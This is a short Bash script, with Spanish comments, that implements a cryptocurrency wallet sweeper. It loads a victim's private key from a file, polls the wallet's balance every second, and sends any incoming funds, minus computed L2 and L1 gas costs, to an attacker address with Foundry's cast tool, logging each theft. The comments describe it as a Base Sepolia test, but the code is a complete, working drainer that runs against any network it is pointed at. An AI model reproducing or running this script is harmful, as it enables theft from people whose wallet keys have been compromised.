#!/usr/bin/env bash
# Sweeper de PRUEBA en Base Sepolia (solo wallets de prueba). Lee VICTIM_PK de archivo, no de argv.
# Resta gas L2 + tarifa L1 (OP Stack GasPriceOracle) con margen.
# Uso: sweeper_sepolia.sh <RPC> <KEYFILE> <ATTACKER_ADDR> <LOG>
export PATH=$HOME/.foundry/bin:$PATH
RPC=$1; KF=$2; ATT=$3; LOG=${4:-/tmp/sweeper_sepolia.log}
. "$KF"; VPK=$VICTIM_PK; unset ATT_PK
VICTIM=$(cast wallet address --private-key $VPK)
GPO=0x420000000000000000000000000000000000000F
echo "$(date -u +%FT%T) sweeper v2 start victim=$VICTIM attacker=$ATT" >> $LOG
while true; do
  BAL=$(cast balance $VICTIM --rpc-url $RPC 2>/dev/null || echo 0)
  if [ -n "$BAL" ] && [ "$BAL" != "0" ]; then
    GP=$(( $(cast gas-price --rpc-url $RPC) * 3 ))
    L1=$(cast call $GPO 'getL1FeeUpperBound(uint256)(uint256)' 120 --rpc-url $RPC 2>/dev/null | awk '{print $1}')
    [ -z "$L1" ] && L1=1000000000000
    COST=$(( GP * 21000 + L1 * 2 ))
    if [ "$BAL" -gt "$COST" ] 2>/dev/null; then
      AMT=$(( BAL - COST ))
      OUT=$(cast send $ATT --value $AMT --gas-limit 21000 --gas-price $GP --legacy --private-key $VPK --rpc-url $RPC 2>&1)
      TX=$(echo "$OUT" | grep -E '^transactionHash' | awk '{print $2}')
      if [ -n "$TX" ]; then echo "$(date -u +%FT%T) SWEPT $AMT wei bal_was=$BAL tx=$TX" >> $LOG
      else echo "$(date -u +%FT%T) SEND_FAIL amt=$AMT bal=$BAL err=$(echo "$OUT" | grep -iE 'error' | head -1 | cut -c1-200)" >> $LOG; fi
    fi
  fi
  sleep 1
done
